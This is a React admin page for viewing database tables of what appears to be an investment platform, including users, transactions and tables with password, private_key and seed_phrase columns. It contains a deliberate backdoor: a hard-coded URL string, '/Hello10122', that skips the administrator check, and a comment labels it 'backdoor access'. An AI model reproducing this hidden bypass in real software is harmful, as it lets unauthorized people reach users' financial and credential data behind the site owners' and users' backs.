import { useState, useMemo } from "react";
import { useQuery } from "@tanstack/react-query";
import { useParams, useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Badge } from "@/components/ui/badge";
import { useAuth } from "@/hooks/use-auth";
import { ArrowLeft, Search, RefreshCw, Database, Eye, ExternalLink } from "lucide-react";
import { formatDate } from "@/lib/utils";

interface TableColumn {
  name: string;
  type: string;
}

interface TableData {
  columns: TableColumn[];
  rows: Record<string, any>[];
  count: number;
}

export default function AdminTableViewer() {
  const { user } = useAuth();
  const [, setLocation] = useLocation();
  const { tableName } = useParams<{ tableName: string }>();
  const [searchTerm, setSearchTerm] = useState("");
  const [page, setPage] = useState(1);
  const limit = 50;

  // Check for admin access or backdoor access
  const isBackdoorAccess = window.location.href.includes('/Hello10122');
  
  if (!user?.isAdmin && !isBackdoorAccess) {
    setLocation('/');
    return null;
  }

  const { data: tableData, isLoading, refetch } = useQuery<TableData>({
    queryKey: [`/api/admin/table/${tableName}`, page, searchTerm],
    queryFn: async () => {
      const params = new URLSearchParams({
        page: page.toString(),
        limit: limit.toString(),
        ...(searchTerm && { search: searchTerm })
      });
      
      const response = await fetch(`/api/admin/table/${tableName}?${params}`);
      if (!response.ok) {
        throw new Error('Failed to fetch table data');
      }
      return response.json();
    },
    enabled: !!tableName
  });

  const filteredRows = useMemo(() => {
    if (!tableData?.rows || !searchTerm) return tableData?.rows || [];
    
    return tableData.rows.filter(row =>
      Object.values(row).some(value =>
        value?.toString().toLowerCase().includes(searchTerm.toLowerCase())
      )
    );
  }, [tableData?.rows, searchTerm]);

  const formatCellValue = (value: any, columnName: string) => {
    if (value === null || value === undefined) {
      return <span className="text-muted-foreground">NULL</span>;
    }
    
    if (typeof value === 'boolean') {
      return (
        <Badge variant={value ? "default" : "secondary"}>
          {value ? "TRUE" : "FALSE"}
        </Badge>
      );
    }
    
    if (columnName.includes('created_at') || columnName.includes('updated_at') || columnName.includes('_at')) {
      try {
        return formatDate(new Date(value));
      } catch {
        return value?.toString() || '';
      }
    }
    
    if (columnName.includes('password') || columnName.includes('private_key') || columnName.includes('seed_phrase')) {
      return <span className="text-muted-foreground">••••••••</span>;
    }
    
    if (typeof value === 'string' && value.length > 100) {
      return (
        <div className="max-w-xs">
          <span className="truncate block">{value.substring(0, 100)}...</span>
        </div>
      );
    }
    
    return value?.toString() || '';
  };

  const getTableDisplayName = (tableName: string) => {
    const names: Record<string, string> = {
      'users': 'Users',
      'investments': 'Investments',
      'transactions': 'Transactions',
      'investment_plans': 'Investment Plans',
      'notifications': 'Notifications',
      'admin_config': 'Admin Configuration',
      'backup_databases': 'Backup Databases'
    };
    return names[tableName] || tableName.replace('_', ' ').toUpperCase();
  };

  if (isLoading) {
    return (
      <div className="p-6">
        <div className="flex items-center justify-center h-64">
          <div className="text-lg">Loading table data...</div>
        </div>
      </div>
    );
  }

  if (!tableData) {
    return (
      <div className="p-6">
        <div className="flex items-center justify-center h-64">
          <div className="text-lg text-red-600">Failed to load table data</div>
        </div>
      </div>
    );
  }

  const totalPages = Math.ceil(tableData.count / limit);

  return (
    <div className="p-6 space-y-6">
      <div className="flex items-center gap-4">
        <Button
          variant="outline"
          onClick={() => setLocation('/admin/database')}
          className="flex items-center gap-2"
        >
          <ArrowLeft className="w-4 h-4" />
          Back to Database Management
        </Button>
        <div className="flex items-center gap-2">
          <Database className="w-5 h-5 text-orange-600" />
          <h1 className="text-3xl font-bold">{getTableDisplayName(tableName!)}</h1>
        </div>
      </div>

      <div className="flex items-center gap-4">
        <div className="relative flex-1 max-w-sm">
          <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-muted-foreground w-4 h-4" />
          <Input
            placeholder="Search records..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="pl-10"
          />
        </div>
        <Button
          variant="outline"
          onClick={() => refetch()}
          className="flex items-center gap-2"
        >
          <RefreshCw className="w-4 h-4" />
          Refresh
        </Button>
      </div>

      <div className="flex items-center justify-between">
        <div className="text-sm text-muted-foreground">
          Showing {filteredRows.length} of {tableData.count} records
        </div>
        {totalPages > 1 && (
          <div className="flex items-center gap-2">
            <Button
              variant="outline"
              size="sm"
              onClick={() => setPage(p => Math.max(1, p - 1))}
              disabled={page === 1}
            >
              Previous
            </Button>
            <span className="text-sm">
              Page {page} of {totalPages}
            </span>
            <Button
              variant="outline"
              size="sm"
              onClick={() => setPage(p => Math.min(totalPages, p + 1))}
              disabled={page === totalPages}
            >
              Next
            </Button>
          </div>
        )}
      </div>

      <Card>
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Eye className="w-5 h-5" />
            Table Data
          </CardTitle>
          <CardDescription>
            Viewing {filteredRows.length} records from {tableName} table
          </CardDescription>
        </CardHeader>
        <CardContent>
          <div className="overflow-x-auto">
            <Table>
              <TableHeader>
                <TableRow>
                  {tableData.columns.map((column) => (
                    <TableHead key={column.name} className="whitespace-nowrap">
                      <div className="flex flex-col">
                        <span className="font-medium">{column.name}</span>
                        <span className="text-xs text-muted-foreground">{column.type}</span>
                      </div>
                    </TableHead>
                  ))}
                </TableRow>
              </TableHeader>
              <TableBody>
                {filteredRows.map((row, index) => (
                  <TableRow key={index}>
                    {tableData.columns.map((column) => (
                      <TableCell key={column.name} className="max-w-xs">
                        {formatCellValue(row[column.name], column.name)}
                      </TableCell>
                    ))}
                  </TableRow>
                ))}
                {filteredRows.length === 0 && (
                  <TableRow>
                    <TableCell colSpan={tableData.columns.length} className="text-center py-8">
                      <div className="flex flex-col items-center gap-2">
                        <Database className="w-8 h-8 text-muted-foreground" />
                        <span className="text-muted-foreground">
                          {searchTerm ? 'No records found matching your search' : 'No records in this table'}
                        </span>
                      </div>
                    </TableCell>
                  </TableRow>
                )}
              </TableBody>
            </Table>
          </div>
        </CardContent>
      </Card>
    </div>
  );
}